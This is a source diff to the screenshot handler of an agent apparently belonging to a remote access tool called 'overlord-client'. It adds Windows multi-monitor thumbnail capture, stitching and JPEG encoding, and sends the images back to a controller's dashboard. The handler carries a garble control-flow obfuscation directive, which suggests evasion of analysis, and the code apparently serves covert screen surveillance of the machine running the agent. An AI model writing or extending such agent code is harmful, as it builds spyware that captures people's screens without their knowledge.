@@ -9,6 +9,9 @@ import (
 	"image/jpeg"
 	"log"
 	goruntime "runtime"
+	"runtime/debug"
+	"sync"
+	"time"
 
 	"overlord-client/cmd/agent/capture"
 	rt "overlord-client/cmd/agent/runtime"
@@ -18,12 +21,18 @@ import (
 )
 
 var (
-	monitorCountFn  = capture.MonitorCount
-	displayBoundsFn = capture.DisplayBounds
-	captureRectFn   = screenshot.CaptureRect
+	monitorCountFn            = capture.MonitorCount
+	displayBoundsFn           = capture.DisplayBounds
+	captureRectFn             = screenshot.CaptureRect
+	thumbnailCaptureDisplayFn = capture.CaptureDisplayRGBAThumbnail
+	thumbnailCaptureCleanupFn = capture.CleanupThumbnailCapture
+	screenshotScavengeMu      sync.Mutex
+	screenshotScavengeTimer   *time.Timer
 )
 
-func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplays bool) error {
+const dashboardThumbnailMaxHeight = 1080
+
+func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplays, dashboardThumbnail bool) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 
 	if allDisplays {
@@ -44,7 +53,16 @@ func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplay
 		}
 	}()
 
-	img, _, bounds, err := captureScreenshotImage(allDisplays)
+	var img *image.RGBA
+	var bounds image.Rectangle
+	var err error
+	if dashboardThumbnail && goruntime.GOOS == "windows" {
+		img, _, bounds, err = captureDashboardThumbnailWindows(allDisplays)
+		thumbnailCaptureCleanupFn()
+		defer scheduleScreenshotHeapScavenge()
+	} else {
+		img, _, bounds, err = captureScreenshotImage(allDisplays)
+	}
 	if err != nil {
 		log.Printf("screenshot: capture failed: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
@@ -56,7 +74,11 @@ func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplay
 	}
 
 	var buf bytes.Buffer
-	opts := &jpeg.Options{Quality: 92}
+	quality := 92
+	if dashboardThumbnail {
+		quality = 85
+	}
+	opts := &jpeg.Options{Quality: quality}
 	if err := jpeg.Encode(&buf, img, opts); err != nil {
 		log.Printf("screenshot: jpeg encode failed: %v", err)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
@@ -89,6 +111,110 @@ func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplay
 		CommandID: cmdID,
 		OK:        true,
 	})
+}
+
+func scheduleScreenshotHeapScavenge() {
+	screenshotScavengeMu.Lock()
+	defer screenshotScavengeMu.Unlock()
+	if screenshotScavengeTimer != nil {
+		screenshotScavengeTimer.Stop()
+	}
+	screenshotScavengeTimer = time.AfterFunc(time.Second, func() {
+		screenshotScavengeMu.Lock()
+		screenshotScavengeTimer = nil
+		screenshotScavengeMu.Unlock()
+		debug.FreeOSMemory()
+	})
+}
+
+func captureDashboardThumbnailWindows(allDisplays bool) (*image.RGBA, int, image.Rectangle, error) {
+	monitorCount := monitorCountFn()
+	if monitorCount <= 0 {
+		return nil, 0, image.Rectangle{}, errors.New("no active displays available")
+	}
+	if !allDisplays {
+		img, err := thumbnailCaptureDisplayFn(0, dashboardThumbnailMaxHeight)
+		if err != nil {
+			return nil, 0, image.Rectangle{}, err
+		}
+		if img == nil {
+			return nil, 0, image.Rectangle{}, errors.New("dashboard thumbnail capture returned no image")
+		}
+		return img, 0, img.Rect, nil
+	}
+
+	type thumbnailPart struct {
+		bounds image.Rectangle
+		img    *image.RGBA
+	}
+	parts := make([]thumbnailPart, 0, monitorCount)
+	minX, minY := int(1e9), int(1e9)
+	monitorBounds := make([]image.Rectangle, monitorCount)
+	maxMonitorHeight := 0
+	for i := 0; i < monitorCount; i++ {
+		bounds := displayBoundsFn(i)
+		monitorBounds[i] = bounds
+		if bounds.Dy() > maxMonitorHeight {
+			maxMonitorHeight = bounds.Dy()
+		}
+		if bounds.Min.X < minX {
+			minX = bounds.Min.X
+		}
+		if bounds.Min.Y < minY {
+			minY = bounds.Min.Y
+		}
+	}
+	if maxMonitorHeight <= 0 {
+		return nil, 0, image.Rectangle{}, errors.New("invalid dashboard monitor bounds")
+	}
+	layoutScale := 1.0
+	if maxMonitorHeight > dashboardThumbnailMaxHeight {
+		layoutScale = float64(dashboardThumbnailMaxHeight) / float64(maxMonitorHeight)
+	}
+	for i, bounds := range monitorBounds {
+		monitorMaxHeight := int(float64(bounds.Dy()) * layoutScale)
+		if monitorMaxHeight < 1 {
+			monitorMaxHeight = 1
+		}
+		img, err := thumbnailCaptureDisplayFn(i, monitorMaxHeight)
+		if err != nil {
+			return nil, 0, image.Rectangle{}, err
+		}
+		if img == nil {
+			return nil, 0, image.Rectangle{}, errors.New("dashboard thumbnail capture returned no image")
+		}
+		parts = append(parts, thumbnailPart{bounds: bounds, img: img})
+	}
+
+	type positionedPart struct {
+		img  *image.RGBA
+		offX int
+		offY int
+	}
+	positioned := make([]positionedPart, len(parts))
+	canvasW, canvasH := 0, 0
+	for i, part := range parts {
+		positioned[i] = positionedPart{
+			img:  part.img,
+			offX: int(float64(part.bounds.Min.X-minX) * layoutScale),
+			offY: int(float64(part.bounds.Min.Y-minY) * layoutScale),
+		}
+		if right := positioned[i].offX + part.img.Rect.Dx(); right > canvasW {
+			canvasW = right
+		}
+		if bottom := positioned[i].offY + part.img.Rect.Dy(); bottom > canvasH {
+			canvasH = bottom
+		}
+	}
+	if canvasW <= 0 || canvasH <= 0 {
+		return nil, 0, image.Rectangle{}, errors.New("invalid dashboard thumbnail bounds")
+	}
+	canvas := image.NewRGBA(image.Rect(0, 0, canvasW, canvasH))
+	for _, part := range positioned {
+		dst := image.Rect(part.offX, part.offY, part.offX+part.img.Rect.Dx(), part.offY+part.img.Rect.Dy())
+		draw.Draw(canvas, dst, part.img, part.img.Rect.Min, draw.Src)
+	}
+	return canvas, 0, canvas.Rect, nil
 }
 
 func captureScreenshotImage(allDisplays bool) (*image.RGBA, int, image.Rectangle, error) {
